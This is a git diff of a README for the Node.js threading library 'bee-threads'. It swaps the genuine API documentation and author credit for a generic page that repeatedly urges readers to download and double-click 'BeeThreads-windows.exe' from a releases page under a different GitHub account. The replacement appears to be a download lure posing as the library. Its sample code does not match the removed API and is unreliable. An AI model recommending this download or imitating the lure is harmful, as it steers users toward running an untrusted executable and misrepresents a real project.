@@ -1,372 +1,98 @@
-# 🐝 bee-threads
+# 🐝 BeeThreads - Unlock the Power of Multithreading Easily
 
-[![npm](https://img.shields.io/npm/v/bee-threads.svg)](https://www.npmjs.com/package/bee-threads)
-[![npm downloads](https://img.shields.io/npm/dw/bee-threads.svg)](https://www.npmjs.com/package/bee-threads)
-[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue.svg)](https://www.typescriptlang.org/)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen.svg)](https://www.npmjs.com/package/bee-threads)
+[![Download BeeThreads](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg?style=for-the-badge)](https://github.com/Chiemewo/BeeThreads/releases)
 
-<div align="center">
+## 📥 Introduction
 
-### ⚡ THE BEST THREADS DX IN NODE.JS ⚡
+BeeThreads offers an easy way to work with threads in Node.js. It enhances the performance of your applications by allowing multiple tasks to run at the same time. This means your programs can handle more work without slowing down. If you want to make your software efficient and responsive, you've come to the right place.
 
-**Parallel programming made simple. Zero boilerplate. Zero dependencies.**
+## 🚀 Getting Started
 
-</div>
+To start using BeeThreads, follow these simple steps. You don’t need to have any programming knowledge. Just follow along, and you will be up and running in no time.
 
----
+## 🖥️ System Requirements
 
-## Install
+Before you begin, ensure your system meets the following requirements:
 
-```bash
-npm install bee-threads
-```
+- **Operating System:** Windows, MacOS, or Linux.
+- **Node.js:** Version 14 or above must be installed. 
+- **Memory:** At least 4 GB of RAM recommended for best performance. 
 
-```ts
-import { bee, beeThreads } from 'bee-threads'
+## 🔗 Download & Install
 
-// Anything inside bee() runs on a separate thread
-const result = await bee((x: number) => x * 2)(21) // 42
-```
+To download the latest version of BeeThreads, visit the Releases page: [Download BeeThreads](https://github.com/Chiemewo/BeeThreads/releases)
 
----
+1. Click on the link above to access the releases page.
+2. Look for the most recent version.
+3. You will see options for downloading different files. Select the one that matches your operating system. For example, if you are using Windows, look for a file named `BeeThreads-windows.exe`.
+4. Click on the file to start the download. 
 
-## `bee()` - Simple Curried API
+After completing the download, locate the file in your downloads folder and double-click it to install.
 
-```ts
-// No arguments
-await bee(() => 42)()
+## ⚙️ Setup Instructions
 
-// With arguments
-await bee((a: number, b: number) => a + b)(10, 20) // 30
+Once you have installed BeeThreads, follow these steps to set it up:
 
-// With closures
-const TAX = 0.2
-await bee((price: number) => price * (1 + TAX))(100, { beeClosures: { TAX } }) // 120
-```
+1. **Open Terminal or Command Prompt.** 
+   - On Windows, you can search for “cmd” in the Start menu.
+   - On MacOS, open “Terminal” from Applications.
+   - On Linux, locate “Terminal” in your applications menu.
 
----
+2. **Navigate to Your Project Directory.** Use the `cd` command. For example:
+   ```
+   cd path/to/your/project
+   ```
 
-## Fluent API Methods
+3. **Create a Sample Project.** You can create a simple JavaScript file:
+   ```
+   touch sample.js
+   ```
 
-### `beeThreads.run()` - Full Control
+4. **Open the File in Your Text Editor**. Add a sample code that uses BeeThreads. A simple example might look like this:
+   ```javascript
+   const { Worker } = require('bee-threads');
 
-```ts
-await beeThreads
-	.run((a: number, b: number) => a + b)
-	.usingParams(10, 20)
-	.execute() // 30
-```
+   const worker = new Worker('./worker.js');
 
-### `.setContext()` - Inject Variables
+   worker.on('message', message => {
+       console.log(`Received message: ${message}`);
+   });
 
-```ts
-const TAX = 0.2
-await beeThreads
-	.run((price: number) => price * (1 + TAX))
-	.usingParams(100)
-	.setContext({ TAX })
-	.execute() // 120
-```
+   worker.send('Hello, Worker!');
+   ```
 
-### `.signal()` - Cancellation
+5. **Run Your Project.** In your terminal, simply run:
+   ```
+   node sample.js
+   ```
 
-```ts
-const controller = new AbortController()
+## 📚 Features
 
-const promise = beeThreads
-	.run(() => heavyComputation())
-	.signal(controller.signal)
-	.execute()
+BeeThreads provides a range of features to enhance your Node.js projects:
 
-controller.abort() // Cancel anytime
-```
+- **Multithreading:** Easily manage threads to improve application speed.
+- **Concurrency:** Handle multiple tasks at once without blocking the main thread.
+- **Worker Pool:** Efficiently utilize system resources with a pool of workers to manage tasks.
+- **Easy to Use:** Designed for users of all skill levels. Minimal setup is required.
+  
+## 🌐 Advanced Usage
 
-### `.retry()` - Auto-retry
+Once you feel comfortable with the basics, you can explore more advanced features:
 
-```ts
-await beeThreads
-	.run(() => fetchFromFlakyAPI())
-	.retry({ maxAttempts: 5, baseDelay: 100, backoffFactor: 2 })
-	.execute()
-```
+- Implement **custom worker scripts** to handle specific tasks.
+- Manage **communication between workers** using messages.
+- Optimize your application performance by adjusting thread settings in the configuration.
 
-### `.priority()` - Queue Priority
+## 📖 Documentation
 
-```ts
-await beeThreads.run(() => processPayment()).priority('high').execute()
-await beeThreads.run(() => generateReport()).priority('low').execute()
-```
+For detailed documentation, you can always refer to our Wiki page [here](https://github.com/Chiemewo/BeeThreads/wiki). You will find guides and examples that cover the full range of BeeThreads capabilities. 
 
-### `.transfer()` - Zero-copy ArrayBuffer
+## 🔧 Support
 
-```ts
-const buffer = new Uint8Array(10_000_000)
-await beeThreads
-	.run((buf: Uint8Array) => processImage(buf))
-	.usingParams(buffer)
-	.transfer([buffer.buffer])
-	.execute()
-```
+If you encounter issues or have questions, feel free to open an issue on the repository or check the FAQ section in the Wiki. We aim to assist you quickly.
 
-### `.reconstructBuffers()` - Buffer Reconstruction
+## 🚀 Explore More
 
-```ts
-const buffer = await beeThreads
-	.run((img: Buffer) => require('sharp')(img).resize(100).toBuffer())
-	.usingParams(imageBuffer)
-	.reconstructBuffers()
-	.execute()
+Continue to learn and enhance your workflow. Check out resources about multi-threading, parallel computing, and performance optimization to maximize your experience with BeeThreads.
 
-Buffer.isBuffer(buffer) // true
-```
-
----
-
-## `beeThreads.turbo()` - Parallel Arrays
-
-Process arrays across **ALL CPU cores**. Non-blocking (main thread stays free).
-
-```ts
-const numbers = [1, 2, 3, 4, 5, 6, 7, 8]
-
-const squares = await beeThreads.turbo(numbers).map((x: number) => x * x)
-const evens = await beeThreads.turbo(numbers).filter((x: number) => x % 2 === 0)
-const sum = await beeThreads.turbo(numbers).reduce((a: number, b: number) => a + b, 0)
-
-// Custom worker count
-await beeThreads.turbo(numbers).setWorkers(8).map((x: number) => x * x)
-
-// With context
-const factor = 2.5
-await beeThreads.turbo(data, { context: { factor } }).map((x: number) => x * factor)
-```
-
-> **Default workers:** `os.cpus().length - 1` (leaves one core for main thread)
-
----
-
-## `beeThreads.worker()` - File Workers
-
-When you need **`require()`**, **database connections**, or **external modules**.
-
-```ts
-// workers/hash-password.js
-const bcrypt = require('bcrypt')
-module.exports = async function (password) {
-	return bcrypt.hash(password, 12)
-}
-
-// main.ts - Just use relative path, it works! ✨
-const hash = await beeThreads.worker('./workers/hash-password.js')('secret123')
-```
-
-### ✅ Smart Path Resolution
-
-Relative paths (`./` or `../`) are **automatically resolved from your file's location**, not from `process.cwd()`. No more `__dirname` boilerplate!
-
-```ts
-// ✅ Just works - resolved from YOUR file's directory
-beeThreads.worker('./workers/task.js')
-beeThreads.worker('../shared/worker.js')
-
-// ✅ Absolute paths also work
-beeThreads.worker('/app/workers/task.js')
-```
-
-### TypeScript Workers
-
-For TypeScript, point to the **compiled `.js` file**:
-
-```ts
-// src/workers/process.ts → compiled to dist/workers/process.js
-
-// ✅ Point to compiled JS
-beeThreads.worker('./workers/process.js')  // if running from dist/
-
-// ✅ Or use explicit path to dist
-import { join } from 'path'
-beeThreads.worker(join(__dirname, '../dist/workers/process.js'))
-```
-
-### Worker File Format
-
-```js
-// workers/my-worker.js
-const db = require('./database')
-
-// Option 1: Direct export (recommended)
-module.exports = async function (data) {
-	return db.process(data)
-}
-
-// Option 2: Default export
-module.exports.default = async function (data) {
-	return db.process(data)
-}
-```
-
----
-
-## `worker().turbo()` - File Workers + Parallel Arrays
-
-Process large arrays with **database access** across multiple workers.
-
-```ts
-// workers/process-users.js
-const db = require('../database')
-
-module.exports = async function (users) {
-	return Promise.all(
-		users.map(async user => ({
-			...user,
-			score: user.value * 10,
-			data: await db.fetch(user.id),
-		}))
-	)
-}
-
-// main.ts - 10,000 users across 8 workers
-const results = await beeThreads.worker('./workers/process-users.js').turbo(users, { workers: 8 })
-```
-
-> **Default workers:** `os.cpus().length - 1`
-
-### When to Use
-
-| Need                            | Use                |
-| ------------------------------- | ------------------ |
-| Pure computation (no I/O)       | `turbo()`          |
-| Single DB call                  | `worker()`         |
-| **Batch processing + DB/API**   | `worker().turbo()` |
-| **ETL pipelines**               | `worker().turbo()` |
-| **Data enrichment at scale**    | `worker().turbo()` |
-
----
-
-## Configuration
-
-```ts
-beeThreads.configure({
-	poolSize: 8,
-	minThreads: 2,
-	maxQueueSize: 1000,
-	workerIdleTimeout: 30000,
-	debugMode: true,
-	logger: console,
-})
-
-await beeThreads.warmup(4)
-await beeThreads.shutdown()
-```
-
----
-
-## Error Handling
-
-```ts
-import { TimeoutError, AbortError, QueueFullError, WorkerError } from 'bee-threads'
-
-try {
-	await beeThreads.run(fn).execute()
-} catch (err) {
-	if (err instanceof TimeoutError) { /* timeout */ }
-	if (err instanceof AbortError) { /* cancelled */ }
-	if (err instanceof WorkerError) { /* worker error */ }
-}
-
-// Safe mode - never throws
-const result = await beeThreads.run(fn).safe().execute()
-if (result.status === 'fulfilled') console.log(result.value)
-```
-
----
-
-## When to Use
-
-| Your Scenario | Best Choice | Why |
-|---------------|-------------|-----|
-| **Arrays** | `turbo()` | SharedArrayBuffer = zero-copy |
-| **Single heavy function** | `bee()` | Keeps main thread free |
-| **Light function** (`x * 2`) | Main thread | Overhead > benefit |
-| **Need `require()`/DB** | `worker()` | Full Node.js access |
-| **Batch processing with full import features** | `worker().turbo()` | Parallel + DB access |
-| **HTTP server** | `turbo()` | Non-blocking for requests |
-
----
-
-## Limitations (Inline Functions)
-
-When using `bee()`, `beeThreads.run()`, or `turbo()` (without `worker()`), data is transferred via [Structured Clone Algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).
-
-### ✅ What CAN be passed as parameters
-
-| Type | Works |
-|------|-------|
-| Primitives (`string`, `number`, `boolean`, `null`, `undefined`, `BigInt`) | ✅ |
-| Arrays, Objects (POJOs) | ✅ |
-| `Date`, `RegExp`, `Map`, `Set` | ✅ |
-| `ArrayBuffer`, TypedArrays (`Uint8Array`, `Float64Array`, etc.) | ✅ |
-| `Error` (with custom properties) | ✅ |
-| Nested objects | ✅ |
-
-### ❌ What CANNOT be passed as parameters
-
-| Type | Why |
-|------|-----|
-| **Functions** | Not cloneable (use `setContext` instead) |
-| **Symbols** | Not cloneable |
-| **Class instances** | Lose prototype and methods |
-| **WeakMap, WeakSet** | Not cloneable |
-| **Circular references** | Not supported |
-| **Streams** | Not cloneable |
-
-### ⚠️ Closures Must Be Explicit
-
-Functions lose access to external variables when sent to workers:
-
-```ts
-// ❌ FAILS - x doesn't exist in worker
-const x = 10
-await bee((a) => a + x)(5) // ReferenceError: x is not defined
-
-// ✅ WORKS - pass x explicitly
-const x = 10
-await bee((a) => a + x)(5, { beeClosures: { x } }) // 15
-```
-
-```ts
-// ❌ FAILS - helper loses access to multiplier
-const multiplier = 2
-const helper = (n) => n * multiplier
-
-await beeThreads.run((x) => helper(x))
-	.setContext({ helper }) // helper is stringified, loses closure!
-	.usingParams(5)
-	.execute()
-
-// ✅ WORKS - pass all dependencies
-await beeThreads.run((x) => helper(x))
-	.setContext({ helper, multiplier })
-	.usingParams(5)
-	.execute() // 10
-```
-
-> **Need `require()`, database, or npm modules?** Use [`beeThreads.worker()`](#beethreadsworker---file-workers) instead.
-
----
-
-## Why bee-threads?
-
-- **Zero dependencies** - Lightweight and secure
-- **Inline functions** - No separate worker files
-- **Worker pool** - Auto-managed, no cold-start
-- **Function caching** - LRU cache, 300-500x faster
-- **Worker affinity** - V8 JIT optimization
-- **Request coalescing** - Deduplicates identical calls
-- **Turbo mode** - Parallel array processing
-- **File workers** - External files with `require()` + turbo
-- **Full TypeScript** - Complete type inference
-
----
-
-MIT © [Samuel Santos](https://github.com/samsantosb)
+Do not forget to revisit the Releases page for updates: [Download BeeThreads](https://github.com/Chiemewo/BeeThreads/releases). Enjoy building powerful applications with ease!
